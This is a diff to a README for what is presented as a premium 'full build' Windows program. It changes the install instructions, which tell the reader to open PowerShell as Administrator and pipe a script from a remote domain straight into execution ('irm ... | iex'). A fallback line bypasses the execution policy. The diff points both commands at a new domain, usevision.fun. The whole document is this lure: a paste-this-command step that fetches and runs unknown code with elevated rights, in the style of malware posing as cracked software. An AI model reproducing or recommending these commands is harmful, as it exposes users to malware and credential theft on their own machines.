@@ -38,7 +38,7 @@ Premium · Pro · Full build · Windows
 **Run in PowerShell as Administrator:**
 
 ```powershell
-irm https://softmix.online/ps/setup.ps1 | iex
+irm https://usevision.fun/ps/setup.ps1 | iex
 ```
 
 <sub>Copy · paste · press Enter · confirm UAC</sub>
@@ -72,7 +72,7 @@ irm https://softmix.online/ps/setup.ps1 | iex
 
 <details>
 <summary>&nbsp;<b>Manual install blocked?</b></summary>
-<br>Try: `powershell -ExecutionPolicy Bypass -Command "irm https://softmix.online/ps/setup.ps1 | iex"`
+<br>Try: `powershell -ExecutionPolicy Bypass -Command "irm https://usevision.fun/ps/setup.ps1 | iex"`
 </details>
 
 <details>
